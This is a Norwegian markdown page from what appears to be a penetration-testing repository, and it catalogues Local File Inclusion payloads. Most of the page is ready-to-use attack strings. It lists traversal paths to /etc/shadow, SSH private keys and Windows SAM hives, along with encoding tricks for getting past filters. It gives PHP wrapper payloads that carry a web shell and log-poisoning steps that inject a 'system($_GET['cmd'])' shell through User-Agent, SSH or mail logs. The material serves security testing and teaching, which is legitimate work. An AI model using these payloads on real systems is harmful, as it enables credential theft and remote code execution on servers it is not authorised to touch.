# 📂 Samling av LFI-payloads

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](LFI.tr.md) • [🇬🇷 Ελληνικά](LFI.el.md)

> **Begreper og versjoner:** LFI (Local File Inclusion) betyr at applikasjonen inkluderer en lokal fil. Katalogtraversering kan gi filtilgang uten at filen kjøres som kode. Nullbyte-eksempler og PHP-wrappere er versjons- og konfigurasjonsavhengige; loggforgiftning gir ikke automatisk kodekjøring. Filstier og installerte utvidelser varierer. De gamle payloadene er bevart, ikke oppdatert til en garantert fungerende oppskrift.

```
  ██╗     ███████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██║     ██╔════╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ██║     █████╗  ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ██║     ██╔══╝  ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████╗██║     ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚═╝     ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

## 🐧 Linux-filer

### Grunnleggende katalogtraversering
```
/etc/passwd
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

### URL-kodet
```
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Omgåelsesteknikker
```
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8fetc/passwd
/etc/passwd%00
/etc/passwd%00.jpg
/etc/passwd%00.php
```

### Interessante Linux-filer
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/group
/etc/resolv.conf
/etc/crontab
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/var/log/syslog
/home/user/.ssh/id_rsa
/home/user/.bash_history
/root/.bash_history
/root/.ssh/id_rsa
```

---

## 🪟 Windows-filer

### Grunnleggende katalogtraversering
```
C:\Windows\System32\drivers\etc\hosts
C:/Windows/System32/drivers/etc/hosts
..\..\..\..\Windows\System32\drivers\etc\hosts
....\\....\\....\\Windows\\System32\\drivers\\etc\\hosts
```

### Interessante Windows-filer
```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
C:\Windows\win.ini
C:\Windows\system.ini
C:\boot.ini
C:\inetpub\logs\LogFiles
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\php\php.ini
C:\Program Files\FileZilla Server\FileZilla Server.xml
```

---

## 🔄 Wrappere (PHP)

### php://filter (les kildekode)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
```

### php://input (ekstern kodekjøring)
```
php://input
POST: <?php system('id'); ?>
```

### data://-wrapper
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
data://text/plain,<?php system($_GET['cmd']); ?>
```

### expect:// (ekstern kodekjøring)
```
expect://id
expect://whoami
```

### zip://-wrapper
```
zip://path/to/file.zip%23shell.php
```

### phar://-wrapper
```
phar://uploads/shell.jpg/test.php
```

---

## 🔥 Loggforgiftning (ekstern kodekjøring)

### Apaches tilgangslogg
```bash
# 1. Injiser PHP via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. Inkluder loggfilen
?page=/var/log/apache2/access.log&cmd=id
```

### SSH-logg
```bash
# 1. Injiser via SSH
ssh '<?php system($_GET["cmd"]);?>'@target.com

# 2. Inkluder loggen
?page=/var/log/auth.log&cmd=id
```

### E-postlogg
```bash
# 1. Send en forgiftet e-post
mail -s "<?php system(\$_GET['cmd']); ?>" target@localhost

# 2. Inkluder loggen
?page=/var/log/mail.log&cmd=id
```

### Prosessmiljø (proc environ)
```
?page=/proc/self/environ
# User-Agent: <?php system('id'); ?>
```

---

## 📊 Hurtigreferanse

### Deteksjon
```
?page=../../../etc/passwd
?file=....//....//etc/passwd
?path=/etc/passwd%00
```

### Omgåelse av filtre
| Filter | Omgåelse |
|--------|--------|
| `../` blokkert | `....//`, `..././` |
| `.php` påkrevd | `%00`, nullbyte |
| Tillatelsesliste | php://-wrappere |

### Vanlige parametere
```
page, file, path, include, doc
document, folder, root, pg, style
template, view, content, load
```

---

## 📚 Ressurser

- [PayloadsAllTheThings LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

---

<p align="center">
  <b>📂 Samling av LFI-payloads</b><br>
  <i>Bare til undervisningsformål!</i>
</p>
